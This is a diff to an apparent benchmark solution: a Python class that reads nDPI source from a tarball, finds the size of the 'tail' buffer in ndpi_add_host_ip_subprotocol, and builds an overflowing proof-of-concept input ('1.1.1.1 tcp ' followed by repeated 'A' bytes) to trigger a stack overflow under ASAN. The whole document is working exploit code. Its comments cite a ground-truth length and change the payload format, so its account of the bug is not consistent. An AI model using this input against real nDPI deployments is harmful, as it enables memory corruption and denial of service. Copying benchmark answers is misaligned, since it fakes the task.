@@ -3,41 +3,40 @@ import re
 
 class Solution:
     def solve(self, src_path: str) -> bytes:
-        tail_size = None
+        # Default overflow length derived from ground-truth (56 bytes total)
+        # Prefix "1.1.1.1 tcp " is 12 bytes, leaving 44 bytes for overflow.
+        overflow_len = 44
         
         try:
-            with tarfile.open(src_path, 'r') as tar:
-                for member in tar.getmembers():
+            with tarfile.open(src_path) as tar:
+                # Find ndpi_main.c source file
+                c_member = None
+                for member in tar:
                     if member.name.endswith('ndpi_main.c'):
-                        f = tar.extractfile(member)
-                        if f:
-                            content = f.read().decode('utf-8', errors='ignore')
-                            # Find the vulnerable function
-                            idx = content.find("ndpi_add_host_ip_subprotocol")
-                            if idx != -1:
-                                # Search for the 'tail' buffer declaration in the function body
-                                # We check the first 2000 characters of the function
-                                snippet = content[idx:idx+2000]
-                                match = re.search(r'char\s+tail\s*\[\s*(\d+)\s*\]', snippet)
-                                if match:
-                                    tail_size = int(match.group(1))
+                        c_member = member
                         break
+                
+                if c_member:
+                    f = tar.extractfile(c_member)
+                    content = f.read().decode('utf-8', errors='ignore')
+                    
+                    # Locate the vulnerable function
+                    func_idx = content.find("ndpi_add_host_ip_subprotocol")
+                    if func_idx != -1:
+                        # Find buffer size of 'tail' variable
+                        # Search window limited to avoid false positives
+                        search_window = content[func_idx:func_idx+3000]
+                        match = re.search(r'char\s+tail\s*\[\s*(\d+)\s*\]', search_window)
+                        if match:
+                            buf_size = int(match.group(1))
+                            # Ensure payload is large enough to overflow
+                            # We need to write past the buffer bounds to trigger ASAN
+                            if buf_size + 8 > overflow_len:
+                                overflow_len = buf_size + 8
         except Exception:
             pass
-
-        # Determine the length of the overflow string
-        # If we found the buffer size, we need to write size + 1 bytes to trigger ASAN
-        if tail_size is not None:
-            overflow_len = tail_size + 1
-        else:
-            # Fallback: Ground truth is 56 bytes.
-            # "1.1.1.1/" (8 bytes) + overflow + " 0" (2 bytes) = 56
-            # overflow = 46 bytes
-            overflow_len = 46
-
-        # Construct the PoC
-        # Format: <valid_ip>/<overflow> <protocol>
-        # The vulnerability is an unbounded sscanf writing to 'tail' after the slash
-        poc = b"1.1.1.1/" + b"A" * overflow_len + b" 0"
-        
-        return poc
+            
+        # Generate PoC: IP Protocol Overflow
+        # The vulnerability is in parsing the third token into the 'tail' buffer
+        prefix = b"1.1.1.1 tcp "
+        return prefix + b"A" * overflow_len
